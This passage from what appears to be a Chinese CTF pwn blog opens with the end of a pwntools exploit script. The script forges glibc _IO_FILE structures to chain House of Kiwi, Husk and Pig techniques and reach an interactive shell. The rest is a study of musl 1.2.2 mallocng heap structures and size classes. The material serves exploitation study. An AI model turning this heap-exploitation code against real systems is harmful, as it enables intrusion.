heap_base + <span class="hljs-number">0xA00</span><br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64((bin_sh_addr - <span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Exp-House-of-Corrosion"><a class="header-anchor" href="#Exp-House-of-Corrosion">¶</a>Exp.House of Corrosion</h3><h1>参考资料</h1><p><a href="https://fmyy.pro/">肥猫嘤嘤’s blog</a></p><p><a href="https://www.anquanke.com/post/id/202387">house-of-husk学习笔记</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">raycp 师傅的 _IO_FILE 系列文章</a></p><p><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie">_IO_FILE利用思路总结 - b0ldfrev</a></p><p><a href="https://bbs.pediy.com/thread-272098.htm">CTF 中 glibc堆利用 及 IO_FILE 总结 - winmt</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【EP.01】 musl-libc</title>
    <link href="/posts/9b2926e8.html"/>
    <url>/posts/9b2926e8.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>时间要是再多点就好了，我能避免许多遗憾。</p></blockquote><p>什么是 <strong>musl</strong> ？</p><p><strong>musl</strong>，一种C标准库，主要使用于以Linux内核为主的操作系统上，目标为嵌入式系统与移动设备。开发此库的目的是写一份干净、高效、符合标准的C标准库。</p><p>为啥要学 <strong>musl</strong> ？<strong>glibc</strong> 玩明白了？</p><p>💢 没玩明白呢还。原因一个是最近的比赛( *<strong>ctf</strong> )接触到了 <strong>musl</strong> ，想学习一下，算是拓展知识面提升自己了。</p><h1>前言</h1><p><strong>musl 1.2.2</strong> 版本源码相比较 1.1.x 有较大变动，这里先从师傅们的文章学习一下 1.2.2 ，其他的以后再来补。</p><h1>源码分析</h1><h2 id="关键数据结构"><a class="header-anchor" href="#关键数据结构">¶</a>关键数据结构</h2><p>先认识一下几个结构体：</p><h3 id="chunk"><a class="header-anchor" href="#chunk">¶</a>chunk</h3><p>源码中并没有显式地定义出 chunk 结构体，实际上其结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint8_t</span> idx;  <span class="hljs-comment">// 低 5bit 作为 idx 表示这是 group 中第几个 chunk, 高3bit作为 reserved</span><br><span class="hljs-type">uint16_t</span> offset; <span class="hljs-comment">// 与第一个 chunk 的偏移</span><br>    <span class="hljs-comment">// idx 和 offset 就是此 chunk 的元数据域了，仅占 4 Byte</span><br><span class="hljs-type">char</span> user_data[];<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">假设用户申请后获得的指针为 char *p，那么 p 就指向 user_data[] 的头部</span><br><span class="hljs-comment">    */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="group"><a class="header-anchor" href="#group">¶</a>group</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// meta 管理 group</span><br><span class="hljs-comment">// group 管理 chunk ，其中的 storage 就是给用户使用的部分</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">meta</span>;</span>   <span class="hljs-comment">// 指向管理本 group 的 meta</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> active_idx:<span class="hljs-number">5</span>;     <span class="hljs-comment">// 5 bit</span><br><span class="hljs-type">char</span> pad[UNIT - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> meta *) - <span class="hljs-number">1</span>];     <span class="hljs-comment">// 16 字节对齐，使给用户的 storage[] 是对齐的</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> storage[];<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="meta"><a class="header-anchor" href="#meta">¶</a>meta</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// meta 管理 group</span><br><span class="hljs-comment">// group 管理 chunk ，其中的 storage 就是给用户使用的部分</span><br><span class="hljs-comment">// meta 管理的 group 个数由 small_cnt_tab 数组指定</span><br><span class="hljs-comment">// meta 管理的 group 中每个 chunk 的大小固定，由 sizeclass 指定</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">prev</span>, *<span class="hljs-title">next</span>;</span>   <span class="hljs-comment">// 说明是双向链表</span><br>    <span class="hljs-comment">// 指向的 group 与 meta 内存页隔离，防止溢出攻击</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group</span> *<span class="hljs-title">mem</span>;</span><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> avail_mask, freed_mask;     <span class="hljs-comment">// 掩码的形式，用一个 bit 表示存在与否</span><br><span class="hljs-type">uintptr_t</span> last_idx:<span class="hljs-number">5</span>;<br><span class="hljs-type">uintptr_t</span> freeable:<span class="hljs-number">1</span>; <span class="hljs-comment">// 标识是否可以被 free</span><br><span class="hljs-type">uintptr_t</span> sizeclass:<span class="hljs-number">6</span>;      <span class="hljs-comment">// 管理的 group 大小，同一个 meta 中保持一致。如果 mem 是 mmap 分配固定为 63</span><br>                <span class="hljs-comment">//if (n &gt;= MMAP_THRESHOLD) &#123; ... g-&gt;sizeclass = 63;&#125;</span><br><span class="hljs-type">uintptr_t</span> maplen:<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uintptr_t</span>)<span class="hljs-number">-12</span>;    <span class="hljs-comment">// 如果管理的 group 是 mmap 分配的，则为内存页数，否则为 0</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="meta-area"><a class="header-anchor" href="#meta-area">¶</a>meta_area</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 单独申请一个内存页，页起始地址为一个 struct meta_area 结构，该内存页剩下的部分就是一个个 meta</span><br><span class="hljs-comment">//const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> &#123;</span><br><span class="hljs-type">uint64_t</span> check;     <span class="hljs-comment">// assert(area-&gt;check == ctx.secret);</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> nslots;     <span class="hljs-comment">// 管理 meta 的个数 一般为定值</span><br>            <span class="hljs-comment">// ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots = (4096-sizeof(struct meta_area))/sizeof *m;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> <span class="hljs-title">slots</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="malloc-context"><a class="header-anchor" href="#malloc-context">¶</a>malloc_context</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_context</span> &#123;</span><br><span class="hljs-type">uint64_t</span> secret;    <span class="hljs-comment">// ctx.secret = get_random_secret();</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGESIZE</span><br><span class="hljs-type">size_t</span> pagesize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">int</span> init_done;  <span class="hljs-comment">//if (!ctx.init_done) &#123; 执行 init ... ctx.init_done = 1;&#125;</span><br><span class="hljs-type">unsigned</span> mmap_counter;  <span class="hljs-comment">// 使用 mmap 分配的次数</span><br>    <span class="hljs-comment">/********************************************************************************/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">free_meta_head</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">avail_meta</span>;</span>    <span class="hljs-comment">// meta_area 中管理的空闲的 meta 首地址</span><br><span class="hljs-type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;<span class="hljs-comment">// avail_meta_count 空闲的 meta 数量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta_area</span> *<span class="hljs-title">meta_area_head</span>, *<span class="hljs-title">meta_area_tail</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *avail_meta_areas;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">active</span>[48];</span>     <span class="hljs-comment">// 缓存可继续分配的 meta，类似 glibc 里的各种 bins</span><br><span class="hljs-type">size_t</span> usage_by_class[<span class="hljs-number">48</span>];   <span class="hljs-comment">// 对应大小的缓存的所有 meta 的 group 所管理的 chunk 个数</span><br><span class="hljs-type">uint8_t</span> unmap_seq[<span class="hljs-number">32</span>], bounces[<span class="hljs-number">32</span>];<br><span class="hljs-type">uint8_t</span> seq;<br><span class="hljs-type">uintptr_t</span> brk;   <span class="hljs-comment">// 记录目前的 sbrk(0) 即 Heap 的最高地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="Musl-mallocng-部分源码分析"><a class="header-anchor" href="#Musl-mallocng-部分源码分析">¶</a>Musl-mallocng 部分源码分析</h2><h3 id="size-to-class"><a class="header-anchor" href="#size-to-class">¶</a>size_to_class</h3><p>计算出来的 size_class 与 malloc_context 中的 <code>active[48]</code> 对应。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IB 4</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">uint16_t</span> size_classes[] = &#123;<br>    <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>,<br>    <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">18</span>, <span class="hljs-number">20</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>,<br>    <span class="hljs-number">36</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">63</span>,<br>    <span class="hljs-number">72</span>, <span class="hljs-number">84</span>, <span class="hljs-number">102</span>, <span class="hljs-number">127</span>,<br>    <span class="hljs-number">146</span>, <span class="hljs-number">170</span>, <span class="hljs-number">204</span>, <span class="hljs-number">255</span>,<br>    <span class="hljs-number">292</span>, <span class="hljs-number">340</span>, <span class="hljs-number">409</span>, <span class="hljs-number">511</span>,<br>    <span class="hljs-number">584</span>, <span class="hljs-number">682</span>, <span class="hljs-number">818</span>, <span class="hljs-number">1023</span>,<br>    <span class="hljs-number">1169</span>, <span class="hljs-number">1364</span>, <span class="hljs-number">1637</span>, <span class="hljs-number">2047</span>,<br>    <span class="hljs-number">2340</span>, <span class="hljs-number">2730</span>, <span class="hljs-number">3276</span>, <span class="hljs-number">4095</span>,<br>    <span class="hljs-number">4680</span>, <span class="hljs-number">5460</span>, <span class="hljs-number">6552</span>, <span class="hljs-number">8191</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> small_cnt_tab[][<span class="hljs-number">3</span>] = &#123;<br>&#123; <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span> &#125;,<br>&#123; <span class="hljs-number">20</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span> &#125;,<br>&#123; <span class="hljs-number">25</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span> &#125;,<br>&#123; <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span> &#125;,<br>&#123; <span class="hljs-number">18</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> &#125;,<br>&#123; <span class="hljs-number">31</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span> &#125;,<br>&#123; <span class="hljs-number">28</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span> &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a_ctz_32</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> x)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> a_clz_32</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>-a_clz_32(x&amp;-x);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> debruijn32[<span class="hljs-number">32</span>] = &#123;<br>        <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">29</span>, <span class="hljs-number">24</span>, <span class="hljs-number">19</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>, <span class="hljs-number">27</span>, <span class="hljs-number">25</span>, <span class="hljs-number">11</span>, <span class="hljs-number">20</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>,<br>        <span class="hljs-number">31</span>, <span class="hljs-number">22</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">26</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">21</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span><br>    &#125;;<br>    <span class="hljs-keyword">return</span> debruijn32[(x&amp;-x)*<span class="hljs-number">0x076be629</span> &gt;&gt; <span class="hljs-number">27</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a_clz_32</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> x)</span><br>&#123;<br>    x &gt;&gt;= <span class="hljs-number">1</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">1</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">2</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">4</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">8</span>;<br>    x |= x &gt;&gt; <span class="hljs-number">16</span>;<br>    x++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>-a_ctz_32(x);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_to_class</span><span class="hljs-params">(<span class="hljs-type">size_t</span> n)</span><br>&#123;<br>    n = (n+IB<span class="hljs-number">-1</span>)&gt;&gt;<span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (n&lt;<span class="hljs-number">10</span>) <span class="hljs-keyword">return</span> n;<br>    n++;<br>    <span class="hljs-type">int</span> i = (<span class="hljs-number">28</span>-a_clz_32(n))*<span class="hljs-number">4</span> + <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> (n&gt;size_classes[i+<span class="hljs-number">1</span>]) i+=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (n&gt;size_classes[i]) i++;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>计算完大概是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x0</span>     ~ <span class="hljs-number">0xc</span> -&gt;<span class="hljs-number">0</span><br><span class="hljs-number">0xd</span>     ~ <span class="hljs-number">0x1c</span> -&gt;<span class="hljs-number">1</span><br><span class="hljs-number">0x1d</span>    ~ <span class="hljs-number">0x2c</span> -&gt;<span class="hljs-number">2</span><br><span class="hljs-number">0x2d</span>    ~ <span class="hljs-number">0x3c</span> -&gt;<span class="hljs-number">3</span><br><span class="hljs-number">0x3d</span>    ~ <span class="hljs-number">0x4c</span> -&gt;<span class="hljs-number">4</span><br><span class="hljs-number">0x4d</span>    ~ <span class="hljs-number">0x5c</span> -&gt;<span class="hljs-number">5</span><br><span class="hljs-number">0x5d</span>    ~ <span class="hljs-number">0x6c</span> -&gt;<span class="hljs-number">6</span><br><span class="hljs-number">0x6d</span>    ~ <span class="hljs-number">0x7c</span> -&gt;<span class="hljs-number">7</span><br><span class="hljs-number">0x7d</span>    ~ <span class="hljs-number">0x8c</span> -&gt;<span class="hljs-number">8</span><br><span class="hljs-number">0x8d</span>    ~ <span class="hljs-number">0x9c</span> -&gt;<span class="hljs-number">9</span><br><span class="hljs-number">0x9d</span>    ~ <span class="hljs-number">0xbc</span> -&gt;<span class="hljs-number">10</span><br><span class="hljs-number">0xbd</span>    ~ <span class="hljs-number">0xec</span> -&gt;<span class="hljs-number">11</span><br><span class="hljs-number">0xed</span>    ~ <span class="hljs-number">0x11c</span> -&gt;<span class="hljs-number">12</span><br><span class="hljs-number">0x11d</span>   ~ <span class="hljs-number">0x13c</span> -&gt;<span class="hljs-number">13</span><br><span class="hljs-number">0x13d</span>   ~ <span class="hljs-number">0x18c</span> -&gt;<span class="hljs-number">14</span><br><span class="hljs-number">0x18d</span>   ~ <span class="hljs-number">0x1ec</span> -&gt;<span class="hljs-number">15</span><br><span class="hljs-number">0x1ed</span>   ~ <span class="hljs-number">0x23c</span> -&gt;<span class="hljs-number">16</span><br><span class="hljs-number">0x23d</span>   ~ <span class="hljs-number">0x29c</span> -&gt;<span class="hljs-number">17</span><br><span class="hljs-number">0x29d</span>   ~ <span class="hljs-number">0x31c</span> -&gt;<span class="hljs-number">18</span><br><span class="hljs-number">0x31d</span>   ~ <span class="hljs-number">0x3ec</span> -&gt;<span class="hljs-number">19</span><br><span class="hljs-number">0x3ed</span>   ~ <span class="hljs-number">0x47c</span> -&gt;<span class="hljs-number">20</span><br><span class="hljs-number">0x47d</span>   ~ <span class="hljs-number">0x53c</span> -&gt;<span class="hljs-number">21</span><br><span class="hljs-number">0x53d</span>   ~ <span class="hljs-number">0x65c</span> -&gt;<span class="hljs-number">22</span><br><span class="hljs-number">0x65d</span>   ~ <span class="hljs-number">0x7ec</span> -&gt;<span class="hljs-number">23</span><br><span class="hljs-number">0x7ed</span>   ~ <span class="hljs-number">0x91c</span> -&gt;<span class="hljs-number">24</span><br><span class="hljs-number">0x91d</span>   ~ <span class="hljs-number">0xa9c</span> -&gt;<span class="hljs-number">25</span><br><span class="hljs-number">0xa9d</span>   ~ <span class="hljs-number">0xcbc</span> -&gt;<span class="hljs-number">26</span><br><span class="hljs-number">0xcbd</span>   ~ <span class="hljs-number">0xfec</span> -&gt;<span class="hljs-number">27</span><br><span class="hljs-number">0xfed</span>   ~ <span class="hljs-number">0x123c</span> -&gt;<span class="hljs-number">28</span><br><span class="hljs-number">0x123d</span>  ~ <span class="hljs-number">0x153c</span> -&gt;<span class="hljs-number">29</span><br><span class="hljs-number">0x153d</span>  ~ <span class="hljs-number">0x198c</span> -&gt;<span class="hljs-number">30</span><br><span class="hljs-number">0x198d</span>  ~ <span class="hljs-number">0x1fec</span> -&gt;<span class="hljs-number">31</span><br><span class="hljs-number">0x1fed</span>  ~ <span class="hljs-number">0x247c</span> -&gt;<span class="hljs-number">32</span><br><span class="hljs-number">0x247d</span>  ~ <span class="hljs-number">0x2a9c</span> -&gt;<span class="hljs-number">33</span><br><span class="hljs-number">0x2a9d</span>  ~ <span class="hljs-number">0x331c</span> -&gt;<span class="hljs-number">34</span><br><span class="hljs-number">0x331d</span>  ~ <span class="hljs-number">0x3fec</span> -&gt;<span class="hljs-number">35</span><br><span class="hljs-number">0x3fed</span>  ~ <span class="hljs-number">0x490c</span> -&gt;<span class="hljs-number">36</span><br><span class="hljs-number">0x490d</span>  ~ <span class="hljs-number">0x553c</span> -&gt;<span class="hljs-number">37</span><br><span class="hljs-number">0x553d</span>  ~ <span class="hljs-number">0x664c</span> -&gt;<span class="hljs-number">38</span><br><span class="hljs-number">0x664d</span>  ~ <span class="hljs-number">0x7fec</span> -&gt;<span class="hljs-number">39</span><br><span class="hljs-number">0x7fed</span>  ~ <span class="hljs-number">0x923c</span> -&gt;<span class="hljs-number">40</span><br><span class="hljs-number">0x923d</span>  ~ <span class="hljs-number">0xaa9c</span> -&gt;<span class="hljs-number">41</span><br><span class="hljs-number">0xaa9d</span>  ~ <span class="hljs-number">0xccbc</span> -&gt;<span class="hljs-number">42</span><br><span class="hljs-number">0xccbd</span>  ~ <span class="hljs-number">0xffec</span> -&gt;<span class="hljs-number">43</span><br><span class="hljs-number">0xffed</span>  ~ <span class="hljs-number">0x1247c</span> -&gt;<span class="hljs-number">44</span><br><span class="hljs-number">0x1247d</span> ~ <span class="hljs-number">0x1553c</span> -&gt;<span class="hljs-number">45</span><br><span class="hljs-number">0x1553d</span> ~ <span class="hljs-number">0x1997c</span> -&gt;<span class="hljs-number">46</span><br></code></pre></td></tr></table></figure><h3 id="malloc"><a class="header-anchor" href="#malloc">¶</a>malloc</h3><p><em>malloc/mallocng/malloc.c</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 